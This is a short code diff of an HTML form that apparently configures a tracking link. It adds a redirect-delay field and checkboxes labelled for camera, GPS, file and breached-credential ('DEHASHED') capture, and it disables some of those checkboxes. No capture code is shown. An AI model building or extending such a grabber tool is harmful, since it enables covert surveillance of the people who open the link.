@@ -38,13 +38,16 @@
       <option value="25">25 days</option>
     </select><br><br>
 
-    |<input type="checkbox" id="L_cam" name="L_cam">
+    <label for="L_redirectTIME">Time befor redirect ms || default 1s</label>
+    <input type="text" id="L_redirectTIME" name="L_redirectTIME" placeholder="Time befor redirect default" value="1000"/><br><br>
+ 
+    |<input type="checkbox" id="L_cam" name="L_cam" disabled>
     <label for="L_cam">Cam Screen |</label>
     <input type="checkbox" id="L_gps" name="L_gps">
     <label for="L_cam">GPS |</label>
-    <input type="checkbox" id="L_dehashed" name="L_dehashed">
+    <input type="checkbox" id="L_dehashed" name="L_dehashed" disabled>
     <label for="L_dehashed">DEHASHED |</label>
-    <input type="checkbox" id="L_file" name="L_file">
+    <input type="checkbox" id="L_file" name="L_file" disabled>
     <label for="L_file">File |</label>
   
     <input type="submit" value="Submit">
